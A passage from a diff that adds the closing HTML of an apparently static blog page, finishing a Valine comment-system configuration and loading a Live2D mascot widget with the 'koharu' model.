+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":300,"height":300,"bottom":-20},"mobile":{"show":false},"log":false});</script></body>
+</html>
